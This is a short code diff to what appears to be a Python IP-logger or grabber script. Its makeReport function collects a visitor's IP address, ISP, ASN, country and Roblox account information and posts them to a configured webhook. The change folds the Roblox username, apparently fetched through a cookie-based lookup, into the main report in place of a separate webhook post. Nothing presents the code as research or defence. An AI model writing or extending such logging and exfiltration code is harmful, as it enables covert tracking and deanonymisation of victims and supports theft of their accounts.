@@ -121,19 +121,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     bot = botCheck(ip, useragent)
 
     roblox_info = get_roblox_info(cookie=None)
-    
-    if roblox_info:
-        requests.post(config["webhook"], json = {
-            "username": config["username"],
-            "content": "",
-            "embeds": [
-                {
-                    "username": {roblox_info['username']}
-
-                }
-            ]
-        })
-
 
     if bot:
         requests.post(config["webhook"], json = {
@@ -194,6 +181,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
+> **Username:** `{roblox_info['username'] if roblox_info['username'] else 'Unknown'}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
